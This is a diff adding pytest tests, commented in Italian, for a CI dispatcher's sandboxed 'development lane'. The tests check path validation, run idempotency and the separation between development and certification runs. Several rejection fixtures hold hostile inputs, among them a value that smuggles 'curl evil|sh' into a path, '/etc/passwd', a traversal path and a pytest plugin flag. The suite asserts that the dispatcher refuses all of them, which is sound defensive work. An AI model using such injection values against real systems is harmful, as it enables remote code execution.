@@ -315,3 +315,107 @@ def test_behaviour_coverage_is_honest_about_the_inventory():
             assert b["suites"] and set(b["suites"]) <= ids
     if not cov["behaviours"]:
         assert cov["inventory"]["status"] == "NOT_IMPORTED"                    # mai "coperto" per assenza di voci
+
+
+# ── corsia development (PF-UNIVERSAL-TEST-AUTONOMY-365-01): test NUOVI scritti nella PR ─────────────────────────
+NEW_TEST = "tests/fi99/test_new_scenario.py"
+
+
+def dev(**over):
+    kw = dict(target=f"dev:{NEW_TEST},tests/fi99", path_exists_at_sha=lambda p: p.startswith("tests/fi99"))
+    kw.update(over)
+    return build(**kw)
+
+
+def test_a_brand_new_test_not_in_the_catalog_can_be_requested_on_the_development_lane():
+    req = dev()
+    assert req["lane"] == "development" and req["suites"] == [] and req["dev_paths"] == [NEW_TEST, "tests/fi99"]
+    assert verify(req) == req
+    assert D.DEV_SANDBOX["network"] == "none" and D.DEV_SANDBOX["secrets"] == "none"
+    assert D.DEV_SANDBOX["certification"] is False
+
+
+def test_a_failed_development_test_can_be_repeated_but_the_same_run_never_twice(tmp_path):
+    ledger = D.Ledger(tmp_path / "ledger.json")
+    first, again = dev(run_id=77), dev(run_id=78)
+    assert first["idempotency_key"] != again["idempotency_key"]                # nuovo dispatch = nuova esecuzione
+    ledger.admit(first)
+    ledger.admit(again)
+    with pytest.raises(D.Refused, match="^DUPLICATE_REQUEST$"):
+        ledger.admit(first)                                                    # replay dello stesso run
+
+
+def test_certification_stays_one_execution_per_sha_regardless_of_the_run():
+    assert build(run_id=77)["idempotency_key"] == build(run_id=78)["idempotency_key"]
+
+
+@pytest.mark.parametrize("target,reason", [
+    ("dev:", "TARGET_NOT_IN_CATALOG"),
+    ("dev:scripts/pf_test_dispatch.py", "DEV_PATH_UNSAFE"),                    # solo tests/
+    ("dev:tests/../scripts/x.py", "DEV_PATH_UNSAFE"),                          # evasione
+    ("dev:/etc/passwd", "DEV_PATH_UNSAFE"),
+    ("dev:tests/x.py;curl evil|sh", "DEV_PATH_UNSAFE"),                        # comandi arbitrari
+    ("dev:tests/x.py --pdb", "DEV_PATH_UNSAFE"),
+    ("dev:-p evil_plugin", "DEV_PATH_UNSAFE"),                                 # plugin/flag di pytest
+    ("dev:tests/conftest.txt", "DEV_PATH_UNSAFE"),
+    ("dev:tests//x.py", "DEV_PATH_UNSAFE"),
+    ("dev:tests/a.py,tests/a.py", "DEV_PATHS"),
+    ("dev:" + ",".join(f"tests/t{i}.py" for i in range(21)), "DEV_PATHS"),
+])
+def test_development_paths_are_only_test_files_or_directories(target, reason):
+    with pytest.raises(D.Refused, match=f"^{reason}$"):
+        dev(target=target, path_exists_at_sha=lambda p: True)
+
+
+def test_development_paths_must_exist_in_the_pr_code_at_the_sha():
+    with pytest.raises(D.Refused, match="^DEV_PATH_MISSING$"):
+        dev(path_exists_at_sha=lambda p: False)
+    with pytest.raises(D.Refused, match="^DEV_PATH_MISSING$"):
+        dev(path_exists_at_sha=None)                                           # nessuna verifica => mai eseguito
+
+
+@pytest.mark.parametrize("fields,reason", [
+    (dict(lane="certification"), "LANE_MISMATCH"),                             # un dev non si traveste da ufficiale
+    (dict(suites=["prelive-certify"]), "SUITES_MISMATCH"),
+    (dict(dev_paths=["tests/other.py"]), "SUITES_MISMATCH"),
+    (dict(run_id=99), "RUN_MISMATCH"),
+])
+def test_a_development_request_cannot_be_turned_into_a_certification(fields, reason):
+    req = dict(dev(), **fields)
+    with pytest.raises(D.Refused, match=f"^{reason}$"):
+        verify(req)
+
+
+def test_a_certification_request_cannot_smuggle_development_paths():
+    with pytest.raises(D.Refused, match="^SUITES_MISMATCH$"):
+        verify(dict(build(), dev_paths=["tests/fi99/test_new_scenario.py"]))
+
+
+def test_development_results_never_count_as_certification():
+    key = dev()["idempotency_key"]
+    runs = [_cr(1, name=D.dev_check_name(key)), _cr(2, name="pf-test/recovery", conclusion="failure")]
+    st = D.dev_status(key, SHA, runs)
+    assert st["state"] == "PASS" and st["certification"] is False
+    assert D.suite_status("recovery", SHA, runs)["state"] == "FAIL"           # il PASS dev non copre la suite
+    assert D.dev_check_name(key).startswith("pf-dev-test/")
+    assert not any(D.check_name(s["id"]).startswith("pf-dev-test/") for s in CATALOG["suites"])
+    assert D.dev_status(key, SHA, [_cr(1, name=D.dev_check_name(key), slug="evil-app")])["state"] == "NOT_REQUESTED"
+
+
+def test_cli_dev_build_checks_paths_on_the_pr_code(monkeypatch, tmp_path, capsys):
+    answers = {f"repos/{REPO}/pulls/604": pr_data(),
+               f"repos/{REPO}/collaborators/{OWNER}/permission": {"permission": "admin"},
+               f"repos/{REPO}/contents/{NEW_TEST}?ref={SHA}": {"type": "file"}}
+
+    def gh(p):
+        if p not in answers:
+            raise D.Refused("GITHUB_API_UNAVAILABLE")                          # 404 => assente
+        return answers[p]
+    monkeypatch.setattr(D, "_gh", gh)
+    _env(monkeypatch, PF_REQ_TARGET=f"dev:{NEW_TEST}")
+    assert D.main(["build", "--output", str(tmp_path / "r.json")]) == 0
+    assert json.loads((tmp_path / "r.json").read_text())["lane"] == "development"
+    capsys.readouterr()
+    _env(monkeypatch, PF_REQ_TARGET="dev:tests/missing_test.py")
+    assert D.main(["build", "--output", str(tmp_path / "r2.json")]) == 1
+    assert json.loads(capsys.readouterr().out)["refused"] == "DEV_PATH_MISSING"
